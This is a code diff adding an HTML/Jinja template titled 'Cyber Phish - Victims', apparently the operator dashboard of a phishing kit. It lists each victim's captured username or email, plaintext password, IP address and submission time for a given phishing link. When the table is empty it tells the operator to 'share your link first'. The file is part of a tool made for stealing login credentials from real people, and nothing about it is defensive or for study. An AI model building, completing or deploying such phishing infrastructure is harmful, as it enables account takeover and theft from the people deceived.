@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head><title>Cyber Phish - Victims</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%); font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif; min-height: 100vh; color: #e0e0e0; }
+    .container { max-width: 1400px; margin: 0 auto; padding: 30px 20px; }
+    .glass-card { background: rgba(20, 28, 40, 0.7); backdrop-filter: blur(12px); border-radius: 32px; border: 1px solid rgba(0, 255, 255, 0.2); box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3); padding: 40px; }
+    .brand { font-size: 2.5rem; font-weight: 800; text-align: center; margin-bottom: 30px; text-shadow: 0 0 10px cyan; }
+    h2 { background: linear-gradient(135deg, #00ffff, #ff00ff); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 20px; }
+    .flex-between { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }
+    .btn-small { display: inline-block; background: #2c3e50; padding: 8px 20px; border-radius: 40px; font-size: 1rem; color: #00ffff; text-decoration: none; }
+    table { width: 100%; border-collapse: collapse; background: rgba(0,0,0,0.3); border-radius: 20px; }
+    th, td { padding: 15px; text-align: left; border-bottom: 1px solid #2a3246; }
+    th { background: #1e2a3a; }
+    code { background: #000; padding: 4px 8px; border-radius: 8px; }
+    @media (max-width: 768px) { .glass-card { padding: 20px; } .brand { font-size: 1.8rem; } }
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="glass-card">
+        <div class="brand">🔐 CYBER PHISH</div>
+        <div class="flex-between">
+            <h2>Captured Data</h2>
+            <a href="/dashboard" class="btn-small">⬅ Back</a>
+        </div>
+        <p><strong>Link ID:</strong> <code>{{ link_id }}</code></p>
+        <div style="overflow-x:auto;">
+        <table>
+            <thead><tr><th>Username/Email</th><th>Password</th><th>IP</th><th>Time</th></tr></thead>
+            <tbody>
+            {% for v in victims %}
+            <tr>
+                <td>{{ v.username }}</td>
+                <td>{{ v.password }}</td>
+                <td>{{ v.ip }}</td>
+                <td>{{ v.submitted_at }}</td>
+            </tr>
+            {% else %}
+            <tr><td colspan="4">No victims yet. Share your link first.</td></tr>
+            {% endfor %}
+            </tbody>
+        </table>
+        </div>
+    </div>
+</div>
+</body>
+</html>
